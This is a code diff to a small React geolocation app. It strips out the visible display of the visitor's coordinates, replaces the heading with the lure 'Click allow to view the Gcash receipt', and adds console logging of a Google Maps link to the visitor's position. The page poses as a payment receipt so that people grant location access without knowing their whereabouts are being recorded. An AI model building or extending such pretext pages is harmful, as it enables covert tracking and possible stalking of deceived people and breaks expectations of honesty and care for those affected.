@@ -24,31 +24,22 @@ function App() {
   }, []);
 
   const getGoogleMapsUrl = (latitude, longitude) => {
-    return `https://www.google.com/maps?q=${latitude},${longitude}`;
+    const gmaplink = `https://www.google.com/maps?q=${latitude},${longitude}`;
+    console.log("gmaplink: ", gmaplink);
+    return gmaplink;
   };
+
+  // Only try to print location when it's available
+  useEffect(() => {
+    if (location) {
+      console.log(`Link: https://www.google.com/maps?q=${location.latitude},${location.longitude}`);
+    }
+  }, [location]);
 
   return (
     <div className="App">
       <header className="App-header">
-        <h1>My Location</h1>
-        {error ? (
-          <p className="error">{error}</p>
-        ) : !location ? (
-          <p>Loading location...</p>
-        ) : (
-          <div>
-            <p>Latitude: {location.latitude}</p>
-            <p>Longitude: {location.longitude}</p>
-            <a
-              href={getGoogleMapsUrl(location.latitude, location.longitude)}
-              target="_blank"
-              rel="noopener noreferrer"
-              className="map-link"
-            >
-              View on Google Maps
-            </a>
-          </div>
-        )}
+        <h1>Click allow to view the Gcash receipt</h1>
       </header>
     </div>
   );
